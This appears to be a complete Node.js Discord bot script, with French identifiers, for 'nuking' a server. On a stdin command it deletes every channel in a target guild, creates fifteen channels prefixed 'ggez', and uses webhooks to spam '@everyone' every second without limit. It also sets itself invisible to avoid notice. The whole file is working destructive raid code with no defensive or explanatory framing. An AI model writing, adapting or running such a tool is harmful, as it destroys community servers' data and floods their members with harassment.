const Discord = require('discord.js');
const client = new Discord.Client();

const botToken = 'token';
const serverId = 'id';
const commande = 'spam';
const nombreCanaux = 15;
const prefixeNomCanaux = 'ggez';
const nombreMessages = Infinity;

async function supprimerCanaux() {
  const server = client.guilds.cache.get(serverId);
  server.channels.cache.forEach(async (channel) => {
    await channel.delete().catch(console.error);
  });
}

async function creerCanaux() {
  const server = client.guilds.cache.get(serverId);
  for (let i = 1; i <= nombreCanaux; i++) {
    const nomCanal = `${prefixeNomCanaux}${i}`;
    await server.channels.create(nomCanal, { type: 'text' }).catch(console.error);
  }
}

async function creerWebhooksEtEnvoyerMessages() {
  const server = client.guilds.cache.get(serverId);
  server.channels.cache.forEach(async (channel) => {
    if (channel.type === 'text') {
      const webhook = await channel.createWebhook('Webhook', {
        avatar: 'https://i.imgur.com/AfFp7pu.png',
      }).catch(console.error);

      if (webhook) {
        let messageCount = 0;
        setInterval(() => {
          webhook.send('@everyone')
            .then(() => {
              messageCount++;
              if (messageCount >= nombreMessages) {
                clearInterval();
              }
            })
            .catch(console.error);
        }, 1000);
      }
    }
  });
}

client.on('ready', () => {
  console.log(`Connecté en tant que ${client.user.tag}`);
  client.user.setPresence({ status: 'invisible' })
    .then(() => console.log('Bot offline'))
    .catch(console.error);

  process.stdin.on('data', (data) => {
    const input = data.toString().trim();
    if (input === commande) {
      supprimerCanaux()
        .then(() => creerCanaux())
        .then(() => creerWebhooksEtEnvoyerMessages())
        .catch(console.error);
    }
  });
});

client.login(botToken);
